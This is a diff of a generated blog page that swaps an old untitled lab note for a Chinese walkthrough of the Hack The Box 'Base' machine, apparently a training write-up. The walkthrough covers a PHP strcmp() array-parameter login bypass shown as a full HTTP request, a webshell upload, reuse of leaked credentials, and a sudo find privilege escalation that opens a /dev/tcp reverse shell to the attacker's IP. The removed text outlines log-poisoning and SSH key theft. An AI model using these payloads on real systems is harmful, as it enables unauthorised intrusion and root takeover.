@@ -8,7 +8,7 @@
   name="viewport"
   content="width=device-width, initial-scale=1, shrink-to-fit=no"
 /><title>
-   | L
+  htb-Base | L
 </title>
 <meta name="description" content="少女祈祷中..."/><script>
   window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"https://test692618.github.io/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"i18n_languages\":[{\"Lang\":\"en\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"English\",\"Locale\":\"\"},{\"Lang\":\"ja\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"日本語\",\"Locale\":\"\"},{\"Lang\":\"zh-cn\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"简体中文\",\"Locale\":\"zh-cn\"},{\"Lang\":\"zh-tw\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"繁體中文\",\"Locale\":\"\"}],\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
@@ -33,20 +33,20 @@
     type="font/woff2"
     crossorigin="anonymous"
   /><link rel="stylesheet" href="/css/loader.min.ac746e154f756f8220326eeb52a719f142ab038be5a8ddf30ea5ef15ef2356ea.css" /><meta property="og:type" content="website" />
-  <meta property="og:title" content=" | L" />
+  <meta property="og:title" content="htb-Base | L" />
   <meta
     property="og:description"
     content="少女祈祷中..."
   />
-  <meta property="og:url" content="https://test692618.github.io/post/images/0x02-fall----%E5%89%AF%E6%9C%AC-2/" />
+  <meta property="og:url" content="https://test692618.github.io/post/htb/htb%E6%89%93%E9%9D%B6-base/" />
   <meta
     property="og:site_name"
     content="HELLO WORLD"
   />
   <meta property="og:image" content="https://test692618.github.io/images/banner.webp" />
   <meta property="article:author" content="L" />
-  <meta property="article:published_time" content="0001-01-01T00:00:00&#43;00:00" />
-  <meta property="article:modified_time" content="0001-01-01T00:00:00&#43;00:00" /><meta name="twitter:card" content="summary" /><meta name="twitter:image" content="https://test692618.github.io/images/banner.webp" />
+  <meta property="article:published_time" content="2026-04-04T00:00:00&#43;00:00" />
+  <meta property="article:modified_time" content="2026-04-04T00:00:00&#43;00:00" /><meta property="article:tag" content="htb" /><meta name="twitter:card" content="summary" /><meta name="twitter:image" content="https://test692618.github.io/images/banner.webp" />
 <link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.min.abc397b347f937380734b44bf4d20f195146ec63edf7d6b881124b192e152126.css" /><link
     rel="preload"
     as="style"
@@ -170,9 +170,9 @@
         });
       </script>
     </nav></div>
-<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner.webp" alt=""><div id="header-outer">
+<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner.webp" alt="htb-Base"><div id="header-outer">
     <div id="header-title"><span id="logo">
-            <h1 data-aos="slide-up">HELLO WORLD</h1>
+            <h1 data-aos="slide-up">htb-Base</h1>
           </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
   </div>
 </header><div id="content"
@@ -186,8 +186,9 @@
 <div class="sidebar-toc-wrapper toc-div-class">
   <nav id="TableOfContents">
   <ul>
-    <li><a href="#port-scan">PORT-SCAN</a></li>
-    <li><a href="#web-pte">WEB-PTE</a></li>
+    <li><a href="#端口枚举">端口枚举</a></li>
+    <li><a href="#web测试">web测试</a></li>
+    <li><a href="#提权">提权</a></li>
   </ul>
 </nav>
 </div></div>
@@ -267,66 +268,147 @@
     class="article-date-link icon-calendar"
     data-aos="zoom-in"
   >
-    <time datetime="0001-01-01 00:00:00 &#43;0000 UTC" itemprop="datePublished"
-      >0001-01-01</time
+    <time datetime="2026-04-04 00:00:00 &#43;0000 UTC" itemprop="datePublished"
+      >2026-04-04</time
     >
     <time style="display: none;" id="post-update-time"
-      >0001-01-01</time
+      >2026-04-04</time
     >
   </span></div>
-</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h2 id="port-scan">
-<a class="header-anchor" href="#port-scan"></a>
-PORT-SCAN
-</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">22/tcp    open   ssh
-</span></span><span class="line"><span class="cl">80/tcp    open   http
-</span></span><span class="line"><span class="cl">111/tcp   closed rpcbind
-</span></span><span class="line"><span class="cl">139/tcp   open   netbios-ssn
-</span></span><span class="line"><span class="cl">443/tcp   open   https
-</span></span><span class="line"><span class="cl">445/tcp   open   microsoft-ds
-</span></span><span class="line"><span class="cl">3306/tcp  open   mysql
-</span></span><span class="line"><span class="cl">8000/tcp  closed http-alt
-</span></span><span class="line"><span class="cl">8080/tcp  closed http-proxy
-</span></span><span class="line"><span class="cl">8443/tcp  closed https-alt
-</span></span><span class="line"><span class="cl">9090/tcp  open   zeus-admin
-</span></span><span class="line"><span class="cl">10080/tcp closed amanda
-</span></span><span class="line"><span class="cl">10443/tcp closed cirrossp
-</span></span></code></pre></div><p>可用 22 ，80 ， 139，445  ，443 ， 3306 ，9090</p>
-<h2 id="web-pte">
-<a class="header-anchor" href="#web-pte"></a>
-WEB-PTE
-</h2><p><img src="./image-20231116232006846.png" alt="image-20231116232006846"></p>
-<p>发现文件包含漏洞，打点思路</p>
-<pre><code>1. 对passwd 和 shadow 文件包含是否可直接查看。
-1. 利用字典爆破枚举，存在哪些目录，比如etc目录下有无类似knockd 对端口进行隐藏的服务。
-1. 寻找日志文件，比如登陆失败，http日志（access.log）等。通过访问日志将webshell写入，再利用文件包含漏洞。
-1. 寻找账户家目录的敏感文件，如.bash_history 或.ssh 等。
-</code></pre>
-<p>这次靶机利用了第4点思路。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
-</span></span><span class="line"><span class="cl">└─$ ssh-keygen 
-</span></span><span class="line"><span class="cl">Generating public/private rsa key pair.
-</span></span><span class="line"><span class="cl">Enter file in which to save the key <span class="o">(</span>/home/kali/.ssh/id_rsa<span class="o">)</span>: 
-</span></span><span class="line"><span class="cl"><span class="c1">##密钥生成时，会在当前用户家目录的.ssh目录下生成 id_rsa  id_rsa.pub 文件</span>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h2 id="端口枚举">
+<a class="header-anchor" href="#%e7%ab%af%e5%8f%a3%e6%9e%9a%e4%b8%be"></a>
+端口枚举
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT   STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp open  ssh
+</span></span><span class="line"><span class="cl">80/tcp open  http
+</span></span></code></pre></div><h2 id="web测试">
+<a class="header-anchor" href="#web%e6%b5%8b%e8%af%95"></a>
+web测试
+</h2><p>通过目录扫描发现login.php.swp文件。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">swp文件是Vim或Vi文本编辑器创建的临时交换文件，主要用于以下两个核心原因：
+</span></span><span class="line"><span class="cl">1. **崩溃恢复**：当编辑会话异常中断（如系统崩溃、终端意外关闭、网络断开）时，swp文件保存着未保存的更改和编辑状态。重新打开原文件时，Vim会提示你恢复内容，防止数据丢失。
+</span></span><span class="line"><span class="cl">2. **避免编辑冲突**：当同一个文件被多个Vim实例同时打开编辑时，后续实例会检测到先打开实例创建的swp文件，从而发出警告，防止多人编辑导致更改相互覆盖。
+</span></span><span class="line"><span class="cl">简单来说，它是Vim的“自动保存和冲突检测”机制文件。
+</span></span></code></pre></div><p><img src="./../images/image-20260404091206676.png" alt="image-20260404091206676"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">└─# strings login.php.swp <span class="p">|</span> tac  
+</span></span><span class="line"><span class="cl">//strings命令：用于提取二进制文件（如可执行程序、数据文件）中的所有可读字符串（通常指可打印字符序列）。常用于分析程序、查找隐藏文本或调试。tac命令：是 cat命令的反向输出，功能是将文件内容按行逆序显示（即最后一行最先显示）。常用于查看日志文件，快速定位最新内容。简单来说，strings用于“从二进制中找文本”，tac用于“把文本行顺序倒过来看”。
+</span></span><span class="line"><span class="cl">  &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">&#34;../assets/js/main.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">session_start<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">(</span>!empty<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;username&#39;</span><span class="o">])</span> <span class="o">&amp;&amp;</span> !empty<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;password&#39;</span><span class="o">]))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    require<span class="o">(</span><span class="s1">&#39;config.php&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span>strcmp<span class="o">(</span><span class="nv">$username</span>, <span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;username&#39;</span><span class="o">])</span> <span class="o">==</span> 0<span class="o">)</span> <span class="o">{</span>   //使用利用strcmp<span class="o">()</span>函数进行身份鉴别，该函数存在绕过漏洞。
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span>strcmp<span class="o">(</span><span class="nv">$password</span>, <span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;password&#39;</span><span class="o">])</span> <span class="o">==</span> 0<span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;user_id&#39;</span><span class="o">]</span> <span class="o">=</span> 1<span class="p">;</span>
+</span></span><span class="line"><span class="cl">            header<span class="o">(</span><span class="s2">&#34;Location: /upload.php&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            print<span class="o">(</span><span class="s2">&#34;&lt;script&gt;alert(&#39;Wrong Username or Password&#39;)&lt;/script&gt;&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        print<span class="o">(</span><span class="s2">&#34;&lt;script&gt;alert(&#39;Wrong Username or Password&#39;)&lt;/script&gt;&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl"><span class="c1">#&#34;! </span>
+</span></span><span class="line"><span class="cl"><span class="m">3210</span>
+</span></span><span class="line"><span class="cl">/var/www/html/login/login.php
+</span></span><span class="line"><span class="cl">base
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">b0VIM 8.0
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">默认情况下，配置时需要将公钥名称改为authorized_keys或authorized_keys2，当然存在对配置文件进行修改
-</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/26<span class="o">]</span>
-</span></span><span class="line"><span class="cl">└─$ cat /etc/ssh/sshd_config <span class="p">|</span> grep auth                                 
-</span></span><span class="line"><span class="cl"><span class="c1"># Expect .ssh/authorized_keys2 to be disregarded by default in future.</span>
-</span></span><span class="line"><span class="cl"><span class="c1">#AuthorizedKeysFile     .ssh/authorized_keys .ssh/authorized_keys2</span>
+</span></span><span class="line"><span class="cl">//strcmp<span class="o">()</span>绕过漏洞：
+</span></span><span class="line"><span class="cl">	函数本身功能：strcmp<span class="o">(</span>str1，srt2<span class="o">)</span>；参数 str1 第一个字符串，str2 第二个字符串，如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。
+</span></span><span class="line"><span class="cl">	漏洞发生点：strcmp函数本身比较字符串类型，但当传参为其他类型时，会出错，出错后返回值0。
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">//在login登录界面，构造如下请求
+</span></span><span class="line"><span class="cl">POST /login/login.php HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 10.129.95.184
+</span></span><span class="line"><span class="cl">Content-Length: <span class="m">29</span>
+</span></span><span class="line"><span class="cl">Cache-Control: max-age<span class="o">=</span><span class="m">0</span>
+</span></span><span class="line"><span class="cl">Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9
+</span></span><span class="line"><span class="cl">Origin: http://10.129.95.184
+</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="o">)</span> AppleWebKit/537.36 <span class="o">(</span>KHTML, like Gecko<span class="o">)</span> Chrome/142.0.0.0 Safari/537.36
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/avif,image/webp,image/apng,*/*<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,application/signed-exchange<span class="p">;</span><span class="nv">v</span><span class="o">=</span>b3<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.7
+</span></span><span class="line"><span class="cl">Referer: http://10.129.95.184/login/login.php
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br
+</span></span><span class="line"><span class="cl">Cookie: <span class="nv">PHPSESSID</span><span class="o">=</span>8po86drn70pusd0saepir1q884
+</span></span><span class="line"><span class="cl">Connection: keep-alive
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">因此通过文件包含寻找到公私钥，存到本地，进行登录。
-</span></span><span class="line"><span class="cl">注意私钥文件使用时 权限必须为0400 否则会报错。
+</span></span><span class="line"><span class="cl">username<span class="o">[]=</span>admin<span class="p">&amp;</span>password<span class="o">[]=</span>admin  //传输数组类型，使函数报错。
+</span></span><span class="line"><span class="cl">---------------------------------------------
+</span></span><span class="line"><span class="cl">后边懒得写了，只写注意点。
+</span></span><span class="line"><span class="cl">//之后就成功登录进来了
+</span></span><span class="line"><span class="cl">//登录界面是个文件上传的界面
+</span></span><span class="line"><span class="cl">//上传webshell之后寻找上传点的目录
+</span></span><span class="line"><span class="cl">//通过目录爆破，找到上传点为/_uploaded
+</span></span><span class="line"><span class="cl">	爆破目录时采取多个字典/usrs/share/dirb/wordlist/ 、 /usrs/share/wordlist、/usr/share/seclists/Discovery/Web-Content/
+</span></span><span class="line"><span class="cl">//执行后获得shell。
+</span></span></code></pre></div><h2 id="提权">
+<a class="header-anchor" href="#%e6%8f%90%e6%9d%83"></a>
+提权
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">// 获得www-data账户shell后在 /var/www/html/login/config.php中发现账户密码
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/26<span class="o">]</span>
-</span></span><span class="line"><span class="cl">└─$ chmod <span class="m">0400</span> id-rsa 
-</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/26<span class="o">]</span>
-</span></span><span class="line"><span class="cl">└─$ ssh qiu@192.168.1.26 -i id-rsa 
-</span></span><span class="line"><span class="cl">成功登录。
+</span></span><span class="line"><span class="cl">cat /var/www/html/login/config.php 
+</span></span><span class="line"><span class="cl">    &lt;?php
+</span></span><span class="line"><span class="cl">    <span class="nv">$username</span> <span class="o">=</span> <span class="s2">&#34;admin&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$password</span> <span class="o">=</span> <span class="s2">&#34;thisisagoodpassword&#34;</span><span class="p">;</span>   
+</span></span><span class="line"><span class="cl"> //又在passwd文件中发现存在john账户，因此尝试使用该账户和密码通过ssh登录
+</span></span><span class="line"><span class="cl"> //登陆后查看sudo权限，发现可使用find命令。
+</span></span><span class="line"><span class="cl"> john@base:~$ sudo -l
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> john: 
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> john on base:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">然后通过翻阅.bash_history文件 发现敏感命令，进行提权。
+</span></span><span class="line"><span class="cl">User john may run the following commands on base:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root : root<span class="o">)</span> /usr/bin/find
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//直接使用find命令提权，做好端口监听执行以下内容。最终获得root权限
+</span></span><span class="line"><span class="cl">sudo find /etc/passwd -exec bash -ip &gt;<span class="p">&amp;</span> /dev/tcp/10.10.16.65/9919 0&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="se">\;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> 	各部分含义：
+</span></span><span class="line"><span class="cl">        sudo - 以 root 权限执行
+</span></span><span class="line"><span class="cl">        find /etc/passwd - 查找 /etc/passwd文件
+</span></span><span class="line"><span class="cl">        -exec ... <span class="se">\;</span> - 对找到的每个文件执行后面的命令
+</span></span><span class="line"><span class="cl">        bash -ip：
+</span></span><span class="line"><span class="cl">        -i：交互式 shell
+</span></span><span class="line"><span class="cl">        -p：保持特权模式（不重置有效用户ID）
+</span></span><span class="line"><span class="cl">        &gt;<span class="p">&amp;</span> /dev/tcp/10.10.16.65/9919 - Bash 的特殊特性：
+</span></span><span class="line"><span class="cl">        /dev/tcp/是 Bash 的内建功能（不是真实文件）
+</span></span><span class="line"><span class="cl">        建立 TCP 连接到 10.10.16.65:9919
+</span></span><span class="line"><span class="cl">        &gt;<span class="p">&amp;</span>将标准输出和标准错误都重定向到该连接
+</span></span><span class="line"><span class="cl">        0&gt;<span class="p">&amp;</span><span class="m">1</span> - 将标准输入也重定向到同一连接
+</span></span><span class="line"><span class="cl">        <span class="se">\;</span> - -exec命令结束符
+</span></span><span class="line"><span class="cl">    实际效果
+</span></span><span class="line"><span class="cl">        当执行时：
+</span></span><span class="line"><span class="cl">        会找到 /etc/passwd文件（通常存在）
+</span></span><span class="line"><span class="cl">        对每个找到的文件（就这一个）执行 Bash 命令
+</span></span><span class="line"><span class="cl">        Bash 会尝试连接到攻击者的机器 10.10.16.65的 9919端口
+</span></span><span class="line"><span class="cl">        建立连接后，会在攻击者的机器上获得一个反向的交互式 Shell
+</span></span><span class="line"><span class="cl">        由于使用了 sudo，这个 Shell 很可能具有 root 权限
 </span></span></code></pre></div></div>
-    <footer class="article-footer"><ul class="article-category-list"></ul>
-<ul class="article-tag-list" itemprop="keywords"></ul>
+    <footer class="article-footer"><ul class="article-category-list"><li class="article-tag-list-item" data-aos="zoom-in">
+    <a
+      class="article-category-link"
+      href="/categories/htb"
+      data-aos="zoom-in"
+      >HTB</a
+    >
+    </li></ul>
+<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/htb"
+        rel="tag"
+        >htb</a
+      >
+    </li></ul>
 </footer>
   </div><nav
     id="article-nav"
@@ -335,27 +417,15 @@ WEB-PTE
   ><div class="article-nav-link-wrap left"><img
               data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
               data-sizes="auto"
-              alt=""
+              alt="htb-Markup"
               class="lazyload"
             /><a
-          href="/post/images/0x02-fall----%E5%89%AF%E6%9C%AC---%E5%89%AF%E6%9C%AC/"
-          aria-label="前一篇:(no title)"
-          title="前一篇:(no title)"
+          href="/post/htb/htb%E6%89%93%E9%9D%B6-markup/"
+          aria-label="前一篇:htb-Markup"
+          title="前一篇:htb-Markup"
         ></a>
         <div class="article-nav-caption">前一篇</div>
-        <h3 class="article-nav-title">(no title)</h3>
-      </div><div class="article-nav-link-wrap right"><img
-              data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
-              data-sizes="auto"
-              alt="NTML协议"
-              class="lazyload"
-            /><a
-          href="/post/ad%E5%9F%9F/ntlm%E5%8D%8F%E8%AE%AE/"
-          aria-label="后一篇:NTML协议"
-          title="后一篇:NTML协议"
-        ></a>
-        <div class="article-nav-caption">后一篇</div>
-        <h3 class="article-nav-title">NTML协议</h3>
+        <h3 class="article-nav-title">htb-Markup</h3>
       </div></nav></article></section>
         </div><footer id="footer" aria-label="Site footer">
   <div style="width: 100%; overflow: hidden">
@@ -406,8 +476,9 @@ WEB-PTE
 <div class="sidebar-toc-wrapper toc-div-class">
   <nav id="TableOfContents">
   <ul>
-    <li><a href="#port-scan">PORT-SCAN</a></li>
-    <li><a href="#web-pte">WEB-PTE</a></li>
+    <li><a href="#端口枚举">端口枚举</a></li>
+    <li><a href="#web测试">web测试</a></li>
+    <li><a href="#提权">提权</a></li>
   </ul>
 </nav>
 </div></div>
@@ -531,9 +602,9 @@ WEB-PTE
   <div><script data-pjax>
         window.REIMU_POST = {
           author: "L",
-          title: "",
-          url: "https:\/\/test692618.github.io\/post\/images\/0x02-fall----%E5%89%AF%E6%9C%AC-2\/",
-          description: " PORT-SCAN 22\/tcp open ssh 80\/tcp open http 111\/tcp closed rpcbind 139\/tcp open netbios-ssn 443\/tcp open https 445\/tcp open microsoft-ds 3306\/tcp open mysql 8000\/tcp closed http-alt 8080\/tcp closed http-proxy 8443\/tcp closed https-alt 9090\/tcp open zeus-admin 10080\/tcp closed amanda 10443\/tcp closed …",
+          title: "htb-Base",
+          url: "https:\/\/test692618.github.io\/post\/htb\/htb%E6%89%93%E9%9D%B6-base\/",
+          description: " 端口枚举 PORT STATE SERVICE 22\/tcp open ssh 80\/tcp open http web测试 通过目录扫描发现login.php.swp文件。\nswp文件是Vim或Vi文本编辑器创建的临时交换文件，主要用于以下两个核心原因： 1. **崩溃恢复**：当编辑会话异常中断（如系统崩溃、终端意外关闭、网络断开）时，swp文件保存着未保存的更改和编辑状态。重新打开原文件时，Vim会提示你恢复内容，防止数据丢失。 2. **避免编辑冲突**：当同一个文件被多个Vim实例同时打开编辑时，后续实例会检测到先打开实例创建的swp文件，从而发出警告，防止多人编辑导致更改相互覆盖 …",
           cover: "https:\/\/test692618.github.io\/images\/banner.webp",
         };
       </script><script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax ></script><script src="/js/tabs.js" integrity="" crossorigin="anonymous" data-pjax defer></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
